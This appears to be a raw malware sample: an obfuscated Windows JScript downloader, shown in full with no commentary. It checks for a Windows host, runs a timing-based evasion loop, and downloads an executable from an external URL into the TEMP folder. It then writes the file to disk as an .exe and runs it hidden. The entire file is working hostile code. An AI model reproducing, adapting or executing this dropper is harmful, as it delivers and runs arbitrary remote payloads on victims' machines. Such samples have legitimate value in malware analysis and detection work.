var R0 = false;
var I = "CreateObject";
var n = function nm() {return WScript[I]("WScript.Shell");}(), TI = 11;
var H = "MSXML2.XMLHTTP";
var PL = 2123213;
var w = 0;
function d(A){n["Run"](A, w, w);};
function SD(){return "" + H;};
function km(K, u){w = w * 1; return K - u;};
function R(){return I;};
/*@cc_on
  @if (@_win32 || @_win64)
    R0 = true;
  @end
@*/
if (R0)
{
var MS = "";
function C0(){return 22;};
var Yr = 0; var g = 0;
function nP()
{
var vN = new this["Date"]();
var lI = vN["getUTCMilliseconds"]();
WScript["Sleep"](C0());
var vN = new this["Date"]();
var Ti = vN["getUTCMilliseconds"]();
WScript["Sleep"](C0());
var vN = new this["Date"]();
var tj = vN["getUTCMilliseconds"]();
var Yr = "W";
Yr = km(Ti, lI);
var g = "B";
g = km(tj, Ti);
MS = "open";
return km(Yr, g);
}
var aH = false;
var zj = false;
for (var vV = w; vV < C0() * 1; vV++){if (nP() != w){
aH = true; 
g = "31" + 11 * Yr + g; 
zj = true; 
break;
}}
function C() {return ((aH == true) && (aH == zj)) ? 1 : w;};
if (aH && C() && zj){
function zr() {return n["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "iQlAy3BN.exe";};
 BB = SD();
 Cy = WScript[I](BB);
 var f = 1;
 while (f){
try {
Cy[MS]("GET", "http://blog.saletron.net/li9soz", false);
Cy["send"]();
QU = "Sleep";
for (;;){WScript[QU](C0() * 11); if (Cy["readystate"] >= 2 * 2) break;};
f = w;
} catch(vG){};
}
function c(Zj) {var I0 = (1, 2, 3, 4, 5, Zj); return I0;};
Fy = WScript[R()]("ADODB.Stream");
BB = Fy;
BB[MS]();
BB["type"] = c(1);
BB["write"](Cy["ResponseBody"]);
Fy["position"] = c(w);
BB["Save" + "ToFile"](zr(), 2);
Fy["c"+"lose"]();
UM = zr();
d(UM);
}
}

